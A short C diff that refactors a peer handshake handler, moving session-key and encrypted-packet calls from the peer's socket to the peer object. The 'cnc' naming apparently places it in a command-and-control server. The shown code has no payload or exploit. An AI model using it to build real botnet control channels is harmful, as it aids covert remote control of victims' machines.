@@ -28,16 +28,16 @@ void handleHandshakeRequest(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uD
     laikaS_read(&peer->sock, peer->peerPub, sizeof(peer->peerPub));
 
     /* gen session keys */
-    if (crypto_kx_server_session_keys(peer->sock.inKey, peer->sock.outKey, cnc->pub, cnc->priv, peer->peerPub) != 0)
+    if (crypto_kx_server_session_keys(peer->inKey, peer->outKey, cnc->pub, cnc->priv, peer->peerPub) != 0)
         LAIKA_ERROR("failed to gen session key!\n")
 
     /* encrypt all future packets */
-    laikaS_setSecure(&peer->sock, true);
+    laikaS_setSecure(peer, true);
 
     /* queue response */
-    laikaS_startOutPacket(&peer->sock, LAIKAPKT_HANDSHAKE_RES);
+    laikaS_startOutPacket(peer, LAIKAPKT_HANDSHAKE_RES);
     laikaS_writeByte(&peer->sock, laikaS_isBigEndian());
-    laikaS_endOutPacket(&peer->sock);
+    laikaS_endOutPacket(peer);
 
     LAIKA_DEBUG("accepted handshake from peer %lx\n", peer);
 }
